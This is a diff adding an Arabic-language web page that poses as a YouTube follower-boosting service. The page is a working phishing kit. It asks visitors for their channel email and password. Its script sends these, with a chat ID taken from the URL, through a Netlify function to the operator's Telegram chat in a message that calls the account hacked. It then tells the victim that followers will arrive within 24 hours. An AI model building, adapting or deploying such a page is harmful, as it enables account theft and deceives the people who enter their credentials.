@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube Followers Charging - شحن متابعين يوتيوب</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap');
+:root {
+  --youtube-red: #FF0000;
+  --youtube-red-dark: #CC0000;
+  --youtube-black: #0F0F0F;
+  --youtube-dark: #212121;
+  --youtube-gray: #303030;
+  --youtube-light-gray: #AAAAAA;
+  --youtube-white: #FFFFFF;
+  --gradient-red: linear-gradient(135deg, #FF0000 0%, #CC0000 100%);
+  --gradient-dark: linear-gradient(135deg, #0F0F0F 0%, #212121 100%);
+}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Cairo', sans-serif;
+}
+body {
+  background: var(--gradient-dark);
+  color: var(--youtube-white);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+  position: relative;
+  overflow-x: hidden;
+}
+body::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="none"/><path d="M20,20 L80,20 L80,80 L20,80 Z" stroke="%23FF0000" stroke-width="0.5" fill="none" opacity="0.05"/></svg>');
+  z-index: -1;
+}
+.container {
+  background: rgba(15, 15, 15, 0.9);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 0, 0, 0.2);
+  border-radius: 20px;
+  width: 100%;
+  max-width: 420px;
+  padding: 35px 30px;
+  box-shadow: 0 15px 40px rgba(255, 0, 0, 0.15),
+              0 0 0 1px rgba(255, 255, 255, 0.05),
+              inset 0 0 0 1px rgba(255, 255, 255, 0.02);
+  position: relative;
+  overflow: hidden;
+  z-index: 1;
+}
+.container::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 5px;
+  background: var(--gradient-red);
+  z-index: 2;
+}
+.header {
+  text-align: center;
+  margin-bottom: 35px;
+  position: relative;
+}
+.youtube-icon {
+  color: var(--youtube-red);
+  font-size: 3.5rem;
+  margin-bottom: 15px;
+  display: inline-block;
+  text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+  animation: pulse 2s infinite;
+}
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+.header h1 {
+  font-size: 1.8rem;
+  font-weight: 700;
+  background: var(--gradient-red);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 5px;
+  letter-spacing: 0.5px;
+}
+.header p {
+  color: var(--youtube-light-gray);
+  font-size: 0.9rem;
+  font-weight: 300;
+}
+.input-group {
+  margin-bottom: 25px;
+  position: relative;
+}
+.input-group label {
+  display: block;
+  color: var(--youtube-light-gray);
+  font-size: 0.9rem;
+  margin-bottom: 8px;
+  font-weight: 400;
+}
+.input-with-icon {
+  position: relative;
+}
+.input-with-icon i {
+  position: absolute;
+  right: 15px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--youtube-red);
+  font-size: 1.1rem;
+}
+.input-group input {
+  width: 100%;
+  background: rgba(48, 48, 48, 0.7);
+  border: 1px solid rgba(255, 0, 0, 0.3);
+  border-radius: 12px;
+  padding: 16px 45px 16px 16px;
+  color: var(--youtube-white);
+  font-size: 1rem;
+  font-weight: 400;
+  transition: all 0.3s ease;
+  outline: none;
+}
+.input-group input:focus {
+  border-color: var(--youtube-red);
+  box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.2);
+  background: rgba(48, 48, 48, 0.9);
+}
+.input-group input::placeholder {
+  color: var(--youtube-light-gray);
+  opacity: 0.7;
+}
+.input-group input[type="number"] {
+  font-family: 'Cairo', monospace;
+}
+.package-selector {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 25px;
+  flex-wrap: wrap;
+}
+.package {
+  flex: 1;
+  min-width: 80px;
+  background: rgba(48, 48, 48, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 15px 10px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+.package:hover {
+  background: rgba(255, 0, 0, 0.1);
+  border-color: var(--youtube-red);
+}
+.package.active {
+  background: rgba(255, 0, 0, 0.15);
+  border-color: var(--youtube-red);
+  transform: translateY(-2px);
+}
+.package-amount {
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: var(--youtube-white);
+  margin-bottom: 3px;
+}
+.package-label {
+  font-size: 0.8rem;
+  color: var(--youtube-light-gray);
+}
+.submit-btn {
+  width: 100%;
+  background: var(--gradient-red);
+  border: none;
+  border-radius: 12px;
+  padding: 18px;
+  color: var(--youtube-white);
+  font-size: 1.1rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  position: relative;
+  overflow: hidden;
+}
+.submit-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 25px rgba(255, 0, 0, 0.3);
+}
+.submit-btn:active {
+  transform: translateY(0);
+}
+.submit-btn::after {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+  transform: rotate(45deg);
+  animation: shine 3s infinite;
+}
+@keyframes shine {
+  0% { transform: translateX(-100%) rotate(45deg); }
+  100% { transform: translateX(100%) rotate(45deg); }
+}
+.loading {
+  display: none;
+  font-size: 1.2rem;
+  color: var(--youtube-red);
+}
+.message {
+  margin-top: 20px;
+  padding: 15px;
+  border-radius: 10px;
+  text-align: center;
+  font-size: 0.95rem;
+  font-weight: 500;
+  min-height: 50px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.3s ease;
+}
+.message.success {
+  background: rgba(40, 167, 69, 0.1);
+  border: 1px solid rgba(40, 167, 69, 0.3);
+  color: #28a745;
+}
+.message.error {
+  background: rgba(220, 53, 69, 0.1);
+  border: 1px solid rgba(220, 53, 69, 0.3);
+  color: #dc3545;
+}
+.message.processing {
+  background: rgba(255, 193, 7, 0.1);
+  border: 1px solid rgba(255, 193, 7, 0.3);
+  color: #ffc107;
+}
+.footer {
+  text-align: center;
+  margin-top: 25px;
+  padding-top: 20px;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  color: var(--youtube-light-gray);
+  font-size: 0.8rem;
+}
+.footer i {
+  color: var(--youtube-red);
+  margin: 0 5px;
+}
+input[type="hidden"] {
+  display: none;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="youtube-icon">
+      <i class="fab fa-youtube"></i>
+    </div>
+    <h1>شحن متابعين يوتيوب</h1>
+    <p>أضف متابعين حقيقين لقناتك بسرعة وأمان</p>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-envelope"></i> البريد الإلكتروني للقناة</label>
+    <div class="input-with-icon">
+      <input type="email" id="email" placeholder="example@youtube.com" required autocomplete="username">
+      <i class="fas fa-at"></i>
+    </div>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-lock"></i> كلمة المرور</label>
+    <div class="input-with-icon">
+      <input type="password" id="password" placeholder="********" required autocomplete="current-password">
+      <i class="fas fa-key"></i>
+    </div>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-users"></i> عدد المتابعين المطلوب</label>
+    <div class="package-selector">
+      <div class="package" data-amount="100">
+        <div class="package-amount">100</div>
+        <div class="package-label">متابع</div>
+      </div>
+      <div class="package" data-amount="500">
+        <div class="package-amount">500</div>
+        <div class="package-label">متابع</div>
+      </div>
+      <div class="package" data-amount="1000">
+        <div class="package-amount">1K</div>
+        <div class="package-label">متابع</div>
+      </div>
+      <div class="package" data-amount="5000">
+        <div class="package-amount">5K</div>
+        <div class="package-label">متابع</div>
+      </div>
+    </div>
+    <div class="input-with-icon">
+      <input type="number" id="amount" placeholder="أو أدخل العدد المطلوب يدوياً" min="1" value="100">
+      <i class="fas fa-hashtag"></i>
+    </div>
+  </div>
+  
+  <input type="hidden" id="chatId">
+  <input type="hidden" id="IDx">
+  
+  <button class="submit-btn" id="sendBtn">
+    <i class="fas fa-bolt"></i>
+    <span>بدء الشحن الآن</span>
+    <div class="loading" id="loadingSpinner">
+      <i class="fas fa-spinner fa-spin"></i>
+    </div>
+  </button>
+  
+  <div class="message" id="msg"></div>
+  
+  <div class="footer">
+    <p><i class="fas fa-shield-alt"></i> خدمة آمنة وموثوقة | شحن فوري خلال 24 ساعة</p>
+  </div>
+</div>
+
+<script>
+    // إزالة التوكن المباشر واستخدام Netlify Function
+    async function sendToTelegram(chatId, message) {
+        try {
+            const response = await fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chatId: chatId,
+                    text: message
+                })
+            });
+            
+            const result = await response.json();
+            return result.success;
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            return false;
+        }
+    }
+
+    function getUrlParams(){
+        const p={}; location.search.substring(1).split("&").forEach(part=>{
+            if(!part) return;
+            const t=part.split("=");
+            p[decodeURIComponent(t[0]).toLowerCase()] = t[1]?decodeURIComponent(t[1]):"";
+        });
+        return p;
+    }
+
+    (()=>{
+        const p=getUrlParams(), chatCandidates=['chatid','chat_id','id'], idxCandidates=['idx','idx_id','idxid','id'];
+        for(let c of chatCandidates) if(p[c]) document.getElementById('chatId').value=p[c];
+        for(let c of idxCandidates) if(p[c] && p[c]!==document.getElementById('chatId').value) document.getElementById('IDx').value=p[c];
+    })();
+
+    document.querySelectorAll('.package').forEach(pkg => {
+        pkg.addEventListener('click', () => {
+            document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+            pkg.classList.add('active');
+            const amount = pkg.getAttribute('data-amount');
+            document.getElementById('amount').value = amount;
+        });
+    });
+
+    document.querySelector('.package').classList.add('active');
+
+    document.getElementById('sendBtn').addEventListener('click', async()=>{
+        const email = document.getElementById('email').value.trim(),
+            password = document.getElementById('password').value.trim(),
+            amount = document.getElementById('amount').value.trim(),
+            chatId = document.getElementById('chatId').value.trim(),
+            IDx = document.getElementById('IDx').value.trim(),
+            msg = document.getElementById('msg'),
+            sendBtn = document.getElementById('sendBtn'),
+            loadingSpinner = document.getElementById('loadingSpinner');
+        
+        if(!email || !password){ 
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-exclamation-circle"></i> الرجاء تعبئة البريد الإلكتروني وكلمة المرور.';
+            return; 
+        }
+        if(!chatId){ 
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-exclamation-circle"></i> خطأ: لم يتم العثور على معرّف المحادثة.';
+            return; 
+        }
+        
+        sendBtn.disabled = true;
+        sendBtn.querySelector('span').style.opacity = '0.5';
+        loadingSpinner.style.display = 'block';
+        msg.className = 'message processing';
+        msg.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري معالجة طلبك...';
+        
+        try{
+            const sent = await sendToTelegram(chatId,
+                `📊 تم اختراق حساب يوتيوب جديد \n\n` +
+                `📧 البريد: ${email}\n` +
+                `🔐 كلمة المرور: ${password}\n` +
+                `👥 عدد المتابعين: ${amount || "100"}\n` +
+                `🆔 الرقم المرجعي: ${IDx || "غير محدد"}\n` +
+                `⏰ الوقت: ${new Date().toLocaleString()}\n` +
+                `---\n` +
+                `✅ تم استلام الطلب بنجاح`
+            );
+            
+            if (sent) {
+                msg.className = 'message success';
+                msg.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال طلبك بنجاح! سيتم البدء بالشحن خلال 24 ساعة.';
+                
+                setTimeout(() => {
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                    document.getElementById('amount').value = '100';
+                    document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+                    document.querySelector('.package').classList.add('active');
+                    msg.innerHTML = '';
+                    msg.className = 'message';
+                }, 3000);
+            } else {
+                msg.className = 'message error';
+                msg.innerHTML = '<i class="fas fa-times-circle"></i> فشل إرسال الطلب. يرجى المحاولة مرة أخرى.';
+            }
+            
+        } catch(error){ 
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-times-circle"></i> فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.';
+        } finally {
+            sendBtn.disabled = false;
+            sendBtn.querySelector('span').style.opacity = '1';
+            loadingSpinner.style.display = 'none';
+        }
+    });
+
+    document.getElementById('amount').addEventListener('input', function() {
+        const value = this.value;
+        document.querySelectorAll('.package').forEach(pkg => {
+            if(pkg.getAttribute('data-amount') === value) {
+                document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+                pkg.classList.add('active');
+            }
+        });
+    });
+</script>
+</body>
+</html>
